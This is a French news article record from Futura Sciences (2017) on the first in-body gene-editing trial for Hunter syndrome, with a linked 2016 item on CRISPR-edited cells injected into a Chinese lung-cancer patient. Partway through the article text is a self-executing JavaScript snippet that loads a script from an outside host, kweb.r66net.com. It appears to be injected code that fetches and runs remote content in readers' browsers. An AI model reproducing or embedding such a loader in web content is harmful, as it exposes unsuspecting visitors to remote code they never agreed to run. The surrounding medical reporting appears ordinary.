{"title": "Première médicale : un patient traité par édition génomique", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "16/11/2017", "content": "Un homme de 44 ans, Brian Madeux, a été traité par une technique d'édition génomique aux États-Unis. Il souffre d'une maladie génétique rare et incurable : la mucopolysaccharidose (MPS) de type II, ou maladie de Hunter. C'est la première fois que l'édition génomique est testée dans l'organisme d'un patient, et non sur des cellules réinjectées ensuite. C'est la première fois que la technique développée par l'entreprise  Sangamo Therapeutics  est testée dans l'organisme d'un patient. Le protocole vise à soigner la  maladie de Hunter , ou mucopolysaccharidose (MPS) de type II, une pathologie dans laquelle les patients n'ont pas d'iduronate-2-sulfatase (IDS), une  enzyme  qui sert à détruire les mucopolysaccharides, des glucides de grande taille. Comme ces derniers s'accumulent dans les cellules (os, articulations, oreilles, poumons, cœur), les patients développent des symptômes du type surdité, petite taille, troubles cardiaques, douleurs articulaires... À la naissance, la maladie touche environ un garçon sur 100.000. Il existe un traitement enzymatique substitutif qui consiste à injecter régulièrement une enzyme dans le sang du malade, ce qui permet une amélioration des symptômes mais pas de rémission totale.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Une nucléase et un virus qui cible les cellules du foie Sangamo veut traiter la MPS de type II grâce à l'édition du génome afin d'insérer le gène correct à un endroit précis de l' ADN  des cellules du foie, pour que celles-ci produisent la  protéine  manquante. L'essai clinique implique des hôpitaux de Chapel Hill, Chicago, Minneapolis et Philadelphie. Pour l'insertion du gène, le procédé créé par l'entreprise (SB-913) n'utilise pas  CRISPR  mais une nucléase à doigt de zinc. Afin de cibler les cellules du foie, la nucléase et le gène correcteur ont été administrés grâce à un vecteur viral, le virus AAV.  La protéine à doigt de zinc se lie à l'ADN et le coupe à un endroit précis. En utilisant le processus naturel de réparation de l'ADN, les cellules insèrent le gène correcteur pour l'IDS à cet endroit. Cette technique a pour avantage de ne pas insérer le gène au hasard dans le génome. D'après  CNN , le patient a reçu le traitement lundi 13 novembre. Le médecin qui suit cet essai clinique a affirmé que le patient avait quitté l'hôpital mardi sans problème particulier. Pour en savoir plus CRISPR : l'édition génétique testée pour la première fois sur l’Homme Article paru le 16 novembre 2016 Pour la première fois, des chercheurs chinois ont injecté à un patient des cellules modifiées grâce à la technologie CRISPR-Cas9. D'autres  essais cliniques  sont prévus en Chine et aux États-Unis pour traiter des  cancers  par cette technique d'édition génomique. Le système  CRISPR-Cas9  est une technique particulièrement simple, peu coûteuse et efficace pour obtenir des cellules modifiées génétiquement. Il combine une enzyme qui coupe l'ADN avec une  molécule  servant de guide moléculaire pour diriger l'enzyme vers le site précis où il faut couper. CRISPR-Cas9 permet ainsi d'inactiver des  gènes . Ce système a été mis au point en 2012 par la Française Emmanuelle Charpentier et l'Américaine Jennifer Doudna.  Des expériences avec CRISPR-Cas9 ont déjà eu lieu sur des  embryons humains  non viables mais c'est la première fois que des cellules modifiées par CRISPR ont été injectées à un adulte. Le 28 octobre, une équipe de l'université de Chengdu, menée par Lu You, a injecté des cellules modifiées à un patient souffrant d'un  cancer du poumon , dans le cadre d'un essai clinique à l'hôpital West China de Chengdu. Cet essai a été approuvé en juillet. Les injections devaient commencer en août mais elles ont été reportées car les cultures cellulaires ont été plus longues que prévu. Les chercheurs ont pris des cellules immunitaires dans le sang du patient et ont inactivé un gène grâce au système CRISPR-Cas9. Le gène inactivé code pour la protéine PD-1 qui, normalement, ralentit la réponse immunitaire ; or le cancer, quand le  système immunitaire  ne joue pas correctement son rôle, en profite pour proliférer. Le système CRISPR-Cas9 associe une enzyme qui coupe l’ADN et une molécule guide. © molekuul_be, Shutterstock                               Des essais cliniques prévus en 2017 en Chine et aux États-Unis L'équipe a cultivé les  cellules génétiquement modifiées  pour augmenter leur nombre, et les a injectées chez le patient qui souffrait d'un  cancer du poumon  métastatique. L'espoir est que, sans PD-1, les cellules modifiées s'attaqueront au cancer. Le patient devrait avoir une seconde injection. L'équipe a prévu de traiter dix personnes qui recevront chacune deux, trois ou quatre injections.  Cet essai clinique a d'abord pour objectif de tester la sécurité de la technique : les participants seront suivis pendant six mois pour savoir s'il y a des effets secondaires. Mais l'équipe regardera aussi si les patients semblent bénéficier du traitement. Cet  essai clinique  est encore à un stade précoce, rien n'a été publié dans une revue à comité de lecture.  D'après  Nature , Chinois et Américains sont engagés dans une course pour être les premiers à utiliser efficacement cette technique. Aux États-Unis, un essai clinique utilisera CRISPR pour cibler trois gènes dans les cellules des participants, toujours dans l'idée de traiter des cancers. Cet essai clinique qui devrait commencer en 2017 est financé par le milliardaire de Napster, Sean Parker. En parallèle, en mars 2017, un groupe de l'université de Pékin espère commencer trois essais cliniques qui utilisent CRISPR contre des cancers de la  vessie , de la  prostate  et du  rein . Mais ces essais sont en attente d'une approbation et d'un financement. Interview : le tabac responsable d’au moins 17 types de cancers                       Il est avéré que fumer augmente les risques de développer un cancer du poumon, mais pas seulement. Le tabac est à l’origine d’au moins seize autres cancers. Futura-Sciences a rencontré Paul Hofman, directeur du laboratoire de pathologie de Nice et chercheur pionnier dans la détection du cancer du poumon, pour en savoir plus sur les risques encourus par les fumeurs.                                       ", "theme": "sante"}